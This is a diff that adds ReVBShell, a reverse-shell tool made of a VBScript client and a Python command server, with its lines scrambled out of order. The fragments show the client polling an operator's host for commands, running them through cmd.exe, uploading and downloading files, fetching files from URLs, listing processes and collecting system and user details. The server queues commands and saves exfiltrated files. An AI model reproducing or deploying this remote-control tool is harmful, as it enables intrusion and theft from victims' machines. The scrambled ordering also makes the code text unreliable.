@@ -1,0 +1,612 @@
+    
+        
+            
+                
+                        strDomainUser = strPDomain 
+                       Note: Variable LHOST is required.
+                      '                       Note: Variable LHOST is required.
+                      '- CD [directory]     - Change directory. Shows current directory when without parameter.
+                      '- DOWNLOAD [path]    - Download the file at [path] to the .
+                      '- GETUID             - Get shell user id.
+                      '- GETWD              - Get working directory. Same as CD.
+                      '- HELP               - Show this help.
+                      '- IFCONFIG           - Show network configuration.
+                      '- KILL               - Stop script on the remote host.
+                      '- PS                 - Show process list.
+                      '- PWD                - Same as GETWD and CD.
+                      '- SHELL [command]    - Execute command in cmd.exe interpreter
+                      '- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).
+                      '- SLEEP [ms]         - Set client polling interval
+                      '- SYSINFO            - Show sytem information.
+                      '- UNSET [name]       - Unset a variable
+                      '- UPLOAD [localpath] - Upload the file at [path] to the remote host.
+                      '- WGET [url]         - Download file from url.
+                    .Open
+                    .Type = 1 'adTypeBinary
+                    .Write http.ResponseBody
+                    Case 0
+                    Case 2
+                    Case 3
+                    Case 8
+                    Case Else
+                    continue
+                    del variables[args.upper()]
+                    os.mkdir('upload')
+                    print '
+                    print 'File not found: %s' % args
+                    print 'Variable LHOST not set'
+                    rmtree('./upload')
+                    strCD = strNewCdPath
+                    strInfo = strInfo 
+                    variables[variable.upper()] = value
+                ' Clean up
+                ' Determine filename
+                ' Read the file to memory
+                ' Set response
+                ' Upload file
+                ' Write to file
+                Dim binFileContents
+                Dim strNewCdPath
+                Dim strSleep
+                Else
+                End If
+                End Select
+                End With
+                If IsArray(objAdapter.IPAddress) Then
+                If fs.FolderExists(strNewCdPath) Then
+                Select Case intHresult
+                With stream
+                args = s
+                args = splitcmd[1]
+                binFileContents = Empty
+                binFileContents = stream.Read
+                cmd = 'WGET'
+                context = ''
+                context = 'SHELL'
+                continue
+                else:
+                exit(0)
+                f.write(result_data)
+                filename = ntpath.basename(args)
+                if 'LHOST' not in variables:
+                if args.upper() in variables:
+                if args:
+                if not args:
+                if not os.path.exists('upload'):
+                if not os.path.exists(args):
+                if os.path.exists('./upload'):
+                intSleep = CInt(strArgument)
+                lhost = variables['LHOST']
+                os.mkdir('Downloads')
+                print 'Shutting down %s' % os.path.basename(__file__)
+                print 'Supported commands:
+                return
+                self.end_headers()
+                self.send_error(404)
+                self.send_response(200)
+                self.wfile.write(f.read())
+                server.shutdown()
+                strFilename = arrSplitUrl(UBound(arrSplitUrl))
+                strInfo = strInfo 
+                strName = objProcess.Name
+                strNewCdPath = GetAbsolutePath(strArgument)
+                strPID = objProcess.Handle
+                strPath = objProcess.ExecutablePath
+                strSession = objProcess.SessionId
+                strSleep = CStr(intSleep)
+                strSleep = Empty
+                strVersion = strVersion 
+                stream.LoadFromFile strFullSourceFilePath
+                stream.Open
+                stream.Type = 1 ' adTypeBinary
+                text = file.ReadAll
+               Exit For
+               strArchitecture = objOS.OSArchitecture
+               strBuild = objOS.BuildNumber
+               strComputer = objOS.CSName
+               strLanguage = objOS.OSLanguage
+               strOS = objOS.Caption
+               strServicePack = objOS.CSDVersion
+            ' Clean up
+            ' Determine filename
+            ' Fetch file
+            ' File does not exist
+            ' Only change directory when argument is provided
+            ' Only download if file exists
+            ' Read out file
+            ' Remove trailing 
+            ' Remove trailing newline
+            ' Set response
+            'Execute and write to file
+            Dim objAdapter
+            Dim strFullSourceFilePath
+            Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) 
+            Dim strVersion
+            Dim text
+            Else
+            End If
+            Err.Clear() ' Set error number to 0
+            For Each objAdapter In arrNetworkAdapters
+            For Each objProcess In arrProcesses
+            If Err.number <> 0 Then
+            If Len(strArgument) > 0 Then
+            If Not file.AtEndOfStream Then
+            If fs.FileExists(strFullSourceFilePath) Then
+            Next
+            WScript.Quit 0
+            WScript.Sleep intSleep
+            args = ''
+            arrSplitUrl = Array()
+            cmd = context
+            cmd_data = cmd_data.replace(context 
+            content = 'NOOP'
+            content = commands.get()
+            elif cmd == 'HELP':
+            elif cmd == 'SET':
+            elif cmd == 'SHELL' and not args:
+            elif cmd == 'SHUTDOWN':
+            elif cmd == 'UNSET':
+            elif cmd == 'UPLOAD':
+            else:
+            file.Close
+            filename = ntpath.basename(self.path)
+            filepath = './upload/%s' % filename
+            http.Send
+            if len(splitcmd) > 1:
+            if not cmd:
+            if not os.path.exists('Downloads'):
+            if not os.path.exists(filepath):
+            if s.upper() == 'EXIT':
+            os.remove(filepath)
+            print 'File 
+            print result_data
+            return
+            strFilename = Empty
+            strFilename = GetAbsolutePath(strFilename)
+            strFilename = arrSplitUrl(UBound(arrSplitUrl))
+            strFullSourceFilePath = Empty
+            strFullSourceFilePath = GetAbsolutePath(strArgument)
+            strOutFile = Empty
+            strVersion = strOS 
+            strVersion = strVersion 
+            text = Empty
+        ' Change Directory
+        ' Download a file from a URL
+        ' Execute command
+        ' Get host info
+        ' IP configuration
+        ' Process list
+        ' Send a file to the server
+        ' Set sleep time
+        ' Sleep X seconds
+        ' Unknown command
+        Case Else
+        cmd = splitcmd[0].upper()
+        cmd_data = form['cmd'].file.read()
+        else:
+        global context
+        if commands.empty():
+        if context == 'SHELL' and cmd != 'CD':
+        if context:
+        if self.path == '/upload':
+        if self.path.startswith('/f/'):
+        print cmd_data
+        result_data = form['result'].file.read()
+        result_filename = form['result'].filename
+        return
+        s = raw_input('%s> ' % context)
+        s = s.strip()
+        self.end_headers()
+        self.send_response(200)
+        self.wfile.write('OK')
+        self.wfile.write(content)
+        strArgument = arrResponseText(1)
+        strOutputPath = strCD 
+        strOutputPath = strPath
+        sys.stdout.write('%s> ' % context)
+    ' Absolute paths : 
+    ' Change stream type To binary
+    ' Clean up
+    ' Compile POST headers and footers
+    ' Convert command to binary
+    ' Determine command and arguments
+    ' Execute command
+    ' Fetch next command
+    ' Fix ups
+    ' Post data
+    ' Receive response
+    ' Relative paths: .. ..
+    ' Return binary data
+    ' Store text in stream
+    ' Use backslashes
+    Dim binData
+    Dim strOutput
+    Dim strOutputPath
+    Dim strRawCommand
+    DoHttpBinaryPost = http.ResponseText
+    Else
+    End If
+    End Select
+    GetAbsolutePath = fs.GetAbsolutePathName(strOutputPath)
+    If UBound(arrResponseText) > 0 Then
+    PadRight = strOutput
+    Select Case strCommand
+    StringToBinary = stream.Read
+    arrResponseText = Array()
+    binConcatenated = stream.Read(stream.Size)
+    binData = StringToBinary(strData)
+    binDataHeader = StringToBinary(vbCrLf 
+    binFooter = StringToBinary(vbCrLf 
+    binText = StringToBinary(strText)
+    def do_GET(self):
+    def do_POST(self):
+    global server
+    http.Send
+    http.Send binConcatenated
+    httpserver = Thread(target=run_httpserver)
+    httpserver.start()
+    main()
+    s = ''
+    server.serve_forever()
+    strArgument = Empty
+    strCommand = Empty
+    strCommand = arrResponseText(0)
+    strInfo = Empty
+    strOutput = LEFT(strInput 
+    strOutput = LEFT(strOutput 
+    strRawCommand = Empty
+    strRawCommand = http.ResponseText
+    stream.Open
+    stream.Position = 0
+    stream.Type = 1 ' adTypeBinary
+    stream.Type = 1 'adTypeBinary
+    stream.Type = 2 'adTypeText
+    stream.Write binData
+    stream.Write binDataHeader
+    stream.Write binFooter
+    stream.Write binText
+    stream.Write binTextHeader
+    stream.WriteText Text
+    while True:
+  Arris Huijgen
+  and/or other materials provided with the distribution.
+  contributors may be used to endorse or promote products derived from
+  https://github.com/bitsadmin/ReVBShell
+  list of conditions and the following disclaimer.
+  this list of conditions and the following disclaimer in the documentation
+  this software without specific prior written permission.
+ 404 if no valid file
+ Author:
+ Check file existence
+ Check if LHOST variable is set
+ Client
+ Compile path
+ Components
+ Copy file
+ Create folder if required
+ Do not write log messages to console
+ Err.Description
+ File download
+ File upload
+ Files
+ HELP
+ Ignore empty commands
+ In a context
+ Loop to add new commands
+ Neither the name of the copyright holder nor the names of its
+ No context
+ OR BUSINESS INTERRUPTION) HOWEVER
+ Print output
+ ReVBShell
+ Remove file from disk
+ Respond
+ Result from executing command
+ Return file
+ Return result
+ Run without treads for debugging purposes
+ SET
+ SHELL
+ SHUTDOWN
+ See the accompanying LICENSE file for more information.
+ Server
+ Server for Reverse VBS Shell
+ Show '> ' command input string after command output
+ Start HTTP server thread
+ Store file
+ This software is provided under under the BSD 3-Clause License.
+ UNSET
+ UPLOAD
+ Update command and args
+ Website:
+ Write file to disk
+ client.vbs - Visual Basic Script client which connectes to the IP/port specified and periodically fetches commands
+ dir dir
+ dir1
+ intSleep - Default delay between the polls to the server
+ objAdapter.Description 
+ should be the IP of the host where server.py is running
+ strArchitecture 
+ strArgument 
+ strBoundary
+ strBoundary 
+ strBuild
+ strCD 
+ strComputer 
+ strFilename 
+ strFullSourceFilePath
+ strHost 
+ strHost - IP of host to connect back to
+ strLanguage
+ strOutFile 
+ strPUsername
+ strPath
+ strPath 
+ strPort
+ strPort - Listening port on the above host
+ strServicePack
+ strSleep 
+ strUserDomain 
+ strUserName
+ strVersion 
+ vbCrLf
+ vbCrLf 
+ vbCrLf)
+!/usr/bin/python
+"                                   ""--"" "
+"                                   ""Content-Disposition: form-data"
+"                                   ""Content-Type: application/octet-stream"" "
+"                        strDomainUser = ""[Access Denied]"""
+"                        strDomainUser = ""[Insufficient Privilege]"""
+"                        strDomainUser = ""[Other]"""
+"                        strDomainUser = ""[Unknown Failure]"""
+"                       When entered without command, switches to SHELL context."
+"                       When entered without ms, shows the current interval."
+"                       When entered without parameters, it shows the currently set variables."
+"                      ""Architecture: "" "
+"                      ""OS: "" "
+"                      ""System Language: "" "
+"                      '                       When entered without command, switches to SHELL context."
+"                      '                       When entered without ms, shows the current interval."
+"                      '                       When entered without parameters, it shows the currently set variables."
+"                      '- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77."
+"                      PadRight(""---"", 5) "
+"                    (variable, value) = args.split(' ')"
+"                    .SaveToFile strFilename, 2 'adSaveCreateOverWrite"
+"                DoHttpBinaryPost ""upload"", strRawCommand, strFilename, binFileContents"
+"                SendStatusUpdate strRawCommand, ""Error when downloading from "" "
+"                SendStatusUpdate strRawCommand, ""File does not exist: "" "
+"                SendStatusUpdate strRawCommand, ""File download from "" "
+"                SendStatusUpdate strRawCommand, ""Sleep is currently set to "" "
+"                SendStatusUpdate strRawCommand, ""Sleep set to "" "
+"                Set stream = CreateObject(""Adodb.Stream"")"
+"                Set stream = createobject(""Adodb.Stream"")"
+"                args = 'http://%s:%d/f/%s' % (lhost, PORT_NUMBER, filename)"
+"                args = args.strip("""
+"                arrSplitUrl = Split(strFullSourceFilePath, """
+"                copyfile(args, './upload/%s' % filename)"
+"                intHresult = objProcess.GetOwner(strPUsername, strPDomain)"
+"                self.send_header('content-type', 'application/octet-stream')"
+"                text = ""[empty result]"""
+"            Dim arrNetworkAdapters: Set arrNetworkAdapters = wmi.ExecQuery(""SELECT "
+"            Dim arrProcesses: Set arrProcesses = wmi.ExecQuery(""SELECT "
+"            Dim file: Set file = fs.OpenTextFile(strOutfile, 1)"
+"            Dim objOS, strComputer, strOS, strBuild, strServicePack, strArchitecture, strLanguage"
+"            Dim objProcess, strPID, strName, strSession, intHresult, strPDomain, strPUsername, strDomainUser, strPath"
+"            Dim strUserDomain, strUsername"
+"            For Each objOS in wmi.ExecQuery(""SELECT "
+"            If strArgument <> """" Then"
+"            If strServicePack <> """" Then"
+"            SendStatusUpdate strRawCommand, ""Goodbye!"""
+"            SendStatusUpdate strRawCommand, ""Unknown command"""
+"            SendStatusUpdate strRawCommand, strCD"
+"            SendStatusUpdate strRawCommand, strInfo"
+"            SendStatusUpdate strRawCommand, text"
+"            arrSplitUrl = Split(strArgument, ""/"")"
+"            fs.DeleteFile strOutFile, True"
+"            http.Open ""GET"", strArgument, False"
+"            shell.Run ""cmd /C pushd """""" "
+"            strInfo = """""
+"            strInfo = ""Computer: "" "
+"            strInfo = ""Username: "" "
+"            strInfo = Mid(strInfo, 1, Len(strInfo)-2)"
+"            strInfo = Mid(strInfo, 1, Len(strInfo)-4)"
+"            strInfo = PadRight(""PID"", 5) "
+"            strUserDomain = shell.ExpandEnvironmentStrings(""%USERDOMAIN%"")"
+"            strUsername = shell.ExpandEnvironmentStrings(""%USERNAME%"")"
+"            with file(os.path.join('Downloads', result_filename), 'wb') as f:"
+"            with open(filepath, 'rb') as f:"
+"        ' Current user, including domain"
+"        ' Self-destruction, exits script"
+"        Case ""CD"""
+"        Case ""DOWNLOAD"""
+"        Case ""GETUID"""
+"        Case ""IFCONFIG"""
+"        Case ""KILL"""
+"        Case ""NOOP"""
+"        Case ""PS"""
+"        Case ""SHELL"""
+"        Case ""SLEEP"""
+"        Case ""SYSINFO"""
+"        Case ""WGET"""
+"        commands.put(' '.join([cmd, args]))"
+"        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})"
+"        self.send_header('content-type', 'text/plain')"
+"        splitcmd = s.split(' ', 1)"
+"        strArgument = """""
+"        strCommand = ""CD"""
+"    ' Concatenate POST headers, data elements and footer"
+"    Const strBoundary = ""----WebKitFormBoundaryNiV6OvjHXJPrEdnb"""
+"    Dim arrResponseText, strCommand, strArgument"
+"    Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated"
+"    Dim stream : Set stream = CreateObject(""Adodb.Stream"")"
+"    Dim stream: Set stream = CreateObject(""Adodb.Stream"")"
+"    DoHttpBinaryPost ""cmd"", strText, ""cmdoutput"", binData"
+"    If Left(strPath, 1) = """
+"    If strCommand = ""PWD"" Or strCommand = ""GETWD"" Then"
+"    arrResponseText = Split(strRawCommand, "" "", 2)"
+"    binTextHeader = StringToBinary(""--"" "
+"    def log_message(self, format, "
+"    global context, variables"
+"    http.Open ""GET"", strUrl "
+"    http.Open ""POST"", strUrl "
+"    http.SetRequestHeader ""Content-Length"", LenB(binConcatenated)"
+"    http.SetRequestHeader ""Content-Type"", ""multipart/form-data"
+"    http.SetTimeouts 5000, 60000, 60000, 60000"
+"    server = HTTPServer(('', PORT_NUMBER), myHandler)"
+"    strArgument = """""
+"    strOutputPath = """""
+"    strPath = Replace(strPath, ""/"", """
+"    stream.CharSet = ""us-ascii"""
+" ""  "" "
+" "" (Build "" "
+" "" successful."""
+" """""" "
+" """""" 2>"
+" """""""" "
+" "")"""
+" "", "" "
+" ""--"" "
+" ""----"" "
+" ""-------"" "
+" ""/"" "
+" ""/"", False"
+" "": "" "
+" "":"" "
+" ""> """""" "
+" ""Path"" "
+" ""Session"" "
+" ""[Interface down]"" "
+" ""ms"""
+" ' ', '')"
+" FROM Win32_NetworkAdapterConfiguration WHERE MACAddress > ''"")"
+" FROM Win32_OperatingSystem"")"
+" FROM Win32_Process"")"
+" Join(objAdapter.IPAddress, vbCrLf) "
+" LOSS OF USE, DATA, OR PROFITS"
+" PadRight(""----"", 19) "
+" PadRight(""----"", 24) "
+" PadRight(""Name"", 24) "
+" PadRight(""User"", 19) "
+" PadRight(strDomainUser, 19) "
+" PadRight(strName, 24) "
+" PadRight(strPid, 5) "
+" PadRight(strSession, 7) "
+" Redistributions in binary form must reproduce the above copyright notice,"
+" Redistributions of source code must retain the above copyright notice, this"
+" Space(intLength), intLength)"
+" String(intLength, "" ""), intLength)"
+" boundary="" "
+" filename="""""" "
+" name=""""cmd"""""" "
+" name=""""result"""""
+" server.py - Interactive Python shell, listening on port 8080 for clients"
+" strActionType, False"
+""" Or InStr(1, strPath, "":"") <> 0 Then"
+"- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77."
+"1"", 0, True"
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"CIMV2"")"
+"Copyright (c) 2017, Arris Huijgen"
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
+"Dim arrSplitUrl, strFilename, stream"
+"Dim fs: Set fs = CreateObject(""Scripting.FileSystemObject"")"
+"Dim http: Set http = CreateObject(""WinHttp.WinHttpRequest.5.1"")"
+"Dim shell: Set shell = CreateObject(""WScript.Shell"")"
+"Dim strHost, strPort, strUrl, strCD, intSleep"
+"Dim wmi: Set wmi = GetObject(""winmgmts:{impersonationLevel=impersonate}!"
+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)"
+"Function PadRight(strInput, intLength)"
+"Function SendStatusUpdate(strText, strData)"
+"If http Is Nothing Then Set http = CreateObject(""MSXML2.ServerXMLHTTP"")"
+"If http Is Nothing Then Set http = CreateObject(""Microsoft.XMLHTTP"")"
+"If http Is Nothing Then Set http = CreateObject(""WinHttp.WinHttpRequest"")"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"Redistribution and use in source and binary forms, with or without"
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer"
+"from shutil import copyfile, rmtree"
+"modification, are permitted provided that the following conditions are met:"
+"n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())"
+"rso.txt"""
+"strCD =  ""."""
+"strHost = ""127.0.0.1"""
+"strPort = ""8080"""
+"strUrl = ""http://"" "
+'  Arris Huijgen
+'  https://github.com/bitsadmin/ReVBShell
+' Author:
+' Client for Reverse VBS Shell
+' Configuration
+' Initialize variables used by GET/WGET
+' Instantiate objects
+' Periodically poll for commands
+' See the accompanying LICENSE file for more information.
+' This software is provided under under the BSD 3-Clause License.
+' Website:
+' downloaded.' % result_filename
+- CD [directory]     - Change directory. Shows current directory when without parameter.
+- DOWNLOAD [path]    - Download the file at [path] to the .
+- GETUID             - Get shell user id.
+- GETWD              - Get working directory. Same as CD.
+- HELP               - Show this help.
+- IFCONFIG           - Show network configuration.
+- KILL               - Stop script on the remote host.
+- PS                 - Show process list.
+- PWD                - Same as GETWD and CD.
+- SHELL [command]    - Execute command in cmd.exe interpreter
+- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).
+- SLEEP [ms]         - Set client polling interval
+- SYSINFO            - Show sytem information.
+- UNSET [name]       - Unset a variable
+- UPLOAD [localpath] - Upload the file at [path] to the remote host.
+- WGET [url]         - Download file from url.
+All rights reserved.
+BSD 3-Clause License
+Configuration can be set in the .vbs file itself.
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+Default settings
+Dim strInfo
+Downloads folder.
+End Function
+Function GetAbsolutePath(strPath)
+Function StringToBinary(Text)
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+On Error Resume Next
+Option Explicit
+PORT_NUMBER = 8080
+SERVICES
+Supported commands
+Wend
+While True
+Windows C:
+Windows D:
+_Interactive Python shell_
+_VBS client_
+args):
+class myHandler(BaseHTTPRequestHandler):
+commands = Queue()
+commands.put('GET C:
+commands.put('SHELL dir C:
+commands.put('SHELL type client.vbs')
+context = ''
+def main():
+def run_httpserver():
+dir .
+dir2
+dir2 dir1
+from Queue import Queue
+from threading import Thread
+if __name__ == '__main__':
+import cgi
+import ntpath
+import os
+import sys
+intSleep = 5000
+root
+run_httpserver() 
+secret.bin')
+server = None
+variables = {}
